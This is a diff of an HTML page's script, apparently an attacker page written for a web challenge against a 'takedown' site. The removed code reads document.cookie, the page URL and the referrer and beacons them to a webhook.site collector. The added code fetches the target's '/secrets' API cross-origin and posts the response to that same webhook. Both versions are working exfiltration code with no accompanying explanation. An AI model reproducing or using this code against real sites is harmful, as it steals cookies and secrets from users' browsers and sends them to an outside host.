@@ -7,50 +7,22 @@
 <body>
   <script>
     const webhook = "https://webhook.site/c0b9443f-e66f-4aa7-a0b7-51437258a216";
-    let relaxedDomain = null;
-    let domainError = null;
-    try {
-      document.domain = "takedown.cyxo.re";
-      relaxedDomain = document.domain;
-    } catch (e) {
-      domainError = `${e.name}: ${e.message}`;
-    }
-
-    function send(payload) {
-      const query = new URLSearchParams({
-        c: payload.cookie || "",
-        u: payload.href || "",
-        r: payload.referrer || "",
-        t: payload.ts || "",
-        phase: payload.phase || "",
-        result: payload.result || "",
-        error: payload.error || ""
-      });
-
-      new Image().src = `${webhook}?${query.toString()}`;
-      navigator.sendBeacon(webhook, JSON.stringify(payload));
-      fetch(webhook, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {"Content-Type": "text/plain"},
-        body: JSON.stringify(payload)
-      });
-    }
-
-    const basePayload = {
-      href: location.href,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      cookie: document.cookie,
-      documentDomain: document.domain,
-      relaxedDomain,
-      domainError,
-      ts: new Date().toISOString()
-    };
-
-    send({...basePayload, phase: "load"});
-
-    send({...basePayload, phase: "ready"});
+    fetch("https://api.takedown.cyxo.re/secrets", {
+    "credentials": "omit",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-GPC": "1",
+        "Priority": "u=4"
+    },
+    "referrer": "https://takedown.cyxo.re/",
+    "method": "GET",
+    "mode": "cors"
+}).then(r => r.json()).then(data => fetch(webhook, {method: "POST", "Content-Type":"application/json", body:data}))
   </script>
 </body>
 </html>
